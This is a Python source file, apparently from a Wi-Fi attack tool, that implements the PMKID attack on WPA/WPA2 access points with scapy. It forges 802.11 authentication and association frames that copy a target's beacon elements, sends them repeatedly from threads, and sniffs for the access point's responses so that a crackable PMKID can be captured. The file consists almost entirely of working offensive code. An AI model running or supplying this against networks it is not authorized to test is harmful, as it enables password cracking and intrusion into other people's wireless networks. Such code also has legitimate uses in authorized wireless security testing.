import os
import re
import sys
import time
import curses
import random
import binascii
import threading
import subprocess
from pull import PULL
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.utils    import PcapWriter
from scapy.packet   import Raw
from scapy.arch     import get_if_raw_hwaddr as HWADDR
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import Dot11EltRSN
from scapy.layers.dot11 import Dot11FCS
from scapy.layers.dot11 import Dot11EltMicrosoftWPA
from scapy.layers.dot11 import Dot11EltCountry
from scapy.layers.dot11 import Dot11Auth
from scapy.layers.dot11 import Dot11AssoReq
from scapy.layers.dot11 import Dot11AssoResp
from scapy.layers.dot11 import Dot11EltRates
from scapy.layers.dot11 import RadioTapExtendedPresenceMask
from scapy.layers.eap   import EAPOL

pull = PULL()

class PMKID:

	__AUTHRUNNER = True
	__AUTHSTATUS = True

	__ASSORUNNER = True
	__ASSOSTATUS = True

	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, beacon, stations, outfname, pauth, passo, dauth, dasso):
		self.interface  = iface
		self.bssid      = bssid
		self.essid      = essid
		self.channel    = channel
		self.power      = power
		self.device     = device
		self.encryption = encryption
		self.cipher     = cipher
		self.auth       = auth
		self.stations   = stations
		self.beacon     = beacon
		self.output     = self.output(outfname)
		self.pauth      = pauth
		self.passo      = passo
		self.dauth      = dauth
		self.dasso      = dasso

	def output(self, fl):
		if fl:
			if fl.endswith(".pmkid"):
				return fl
			elif fl.endswith("."):
				return (fl + "pmkid")
			else:
				return (fl + ".pmkid")
		else:
			return False

	def extract_sn_rc(self, pkt):
		try:
			sn = pkt.getlayer(Dot11FCS).addr2
			rc = pkt.getlayer(Dot11FCS).addr1
		except:
			sn = pkt.getlayer(Dot11).addr2
			rc = pkt.getlayer(Dot11).addr1

		return (sn, rc)

	def channeler(self):
		ch = str(self.channel)
		subprocess.call(['iwconfig', self.interface, 'channel', ch])

	def get_my_address(self):
		retval = HWADDR(self.interface)
		family = retval[0]
		hwaddr = retval[1]
		hwaddr = binascii.hexlify(hwaddr).decode()
		hwaddr = ':'.join(hwaddr[i:i+2] for i in range(0,12,2))
		return hwaddr

	def forge_auth_frame(self, ap, cl):
		pkt = RadioTap() / Dot11(
				type=0,
				subtype=11,
				addr1=ap,
				addr2=cl,
				addr3=ap
			) / Dot11Auth(
				seqnum=1,
			)

		return pkt

	def forge_asso_frame(self, ap, cl):
		def enum(pkt):
			elts = pkt.getlayer(Dot11Elt)
			retval, count = {}, 0

			try:
				while isinstance(elts[count], Dot11Elt):
					if hasattr(elts[count], "ID"):
						if elts[count].ID == 0 or elts[count].ID == 1 or elts[count].ID == 50 or elts[count].ID == 48 or elts[count].ID == 45 or elts[count].ID == 127 or elts[count].ID == 59 or elts[count].ID == 221:
							retval[ elts[count].ID ] = elts[count]
					count += 1
			except IndexError:
				pass

			return retval

		def form(efields, layer):
			print(efields)
			for key in list(efields.items()):
				if key == 0 or key == 1 or key == 50 or key == 48 or key == 45 or key == 127 or key == 59 or key == 221:
					layer /= efields.get(key)
			
			return layer

		capibility = self.beacon.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
		pkt        = RadioTap(
							version=0,
							pad=0,
							present="Flags+Rate+Channel+dBm_AntSignal+Antenna+RXFlags",
							Rate=2,
							Flags="",
							dBm_AntSignal=-30,
							Antenna=1,
							RXFlags="",
							notdecoded=''
						) / Dot11(
							subtype=0,
							type=0,
							proto=0,
							FCfield="",
							ID=14849,
							SC=608,
							addr1=ap,
							addr2=cl,
							addr3=ap
						) / Dot11AssoReq(
							cap="short-slot+ESS+privacy+short-preamble",
							listen_interval=10
						)

		efields    = enum(self.beacon)
		pkt        = form(efields, pkt)
		return pkt

	def auth_sender(self, pkt):
		while self.__AUTHRUNNER:
			sendp(
				pkt,
				iface=self.interface,
				count=self.pauth,
				inter=self.dauth,
				verbose=False
			)

			if self.__AUTHRUNNER:
				pull.print(
					"*",
					"Authentication Req. Count [{packets}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
						packets=pull.RED+str(self.pauth)+pull.END,
						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
						ap=self.bssid.upper(),
						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
						sta=self.myaddress.upper(),
						essid=pull.YELLOW+self.essid+pull.END
					),
					"\r",
					pull.YELLOW
				)

		self.__AUTHSTATUS = False

	def auth_receiver(self, pkt):
		if pkt.haslayer(Dot11Auth):
			retval = self.extract_sn_rc(pkt)
			sn     = retval[0]
			rc     = retval[1]

			if sn == self.bssid and rc == self.myaddress:
				pull.print(
					"$",
					"Authentication Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
						status=pull.GREEN+"Confirmed!"+pull.END,
						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
						ap=self.bssid.upper(),
						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
						sta=self.myaddress.upper(),
						essid=pull.YELLOW+self.essid+pull.END
					),
					"\r",
					pull.GREEN
				)
				raise KeyboardInterrupt()

	def asso_sender(self, pkt):
		while self.__ASSORUNNER:
			sendp(
				pkt,
				iface=self.interface,
				count=self.passo,
				inter=self.dasso,
				verbose=False
			)

			if self.__ASSORUNNER:
				pull.print(
					"*",
					"Association Req. Count [{packets}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
						packets=pull.RED+str(self.passo)+pull.END,
						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
						ap=self.bssid.upper(),
						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
						sta=self.myaddress.upper(),
						essid=pull.YELLOW+self.essid+pull.END
					),
					"\r",
					pull.YELLOW
				)

		self.__ASSOSTATUS = False

	def asso_receiver(self, pkt):
		if pkt.haslayer(Dot11AssoResp):
			retval = self.extract_sn_rc(pkt)
			sn     = retval[0]
			rc     = retval[1]

			if sn == self.bssid and rc == self.myaddress:
				pull.print(
					"$",
					"Authentication Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
						status=pull.GREEN+"Confirmed!"+pull.END,
						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
						ap=self.bssid.upper(),
						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
						sta=self.myaddress.upper(),
						essid=pull.YELLOW+self.essid+pull.END
					),
					"\r",
					pull.GREEN
				)
				raise KeyboardInterrupt()

	def engage(self):
		self.myaddress  = self.get_my_address()
		auth_frame = self.forge_auth_frame( self.bssid, self.myaddress )
		asso_frame = self.forge_asso_frame( self.bssid, self.myaddress )

		t = threading.Thread(target=self.auth_sender, args=(auth_frame,))
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.auth_receiver)

		self.__AUTHRUNNER = False
		while self.__AUTHSTATUS:
			pass

		t = threading.Thread(target=self.asso_sender, args=(asso_frame,))
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.asso_receiver)

		self.__ASSORUNNER = False
		while self.__ASSOSTATUS:
			pass

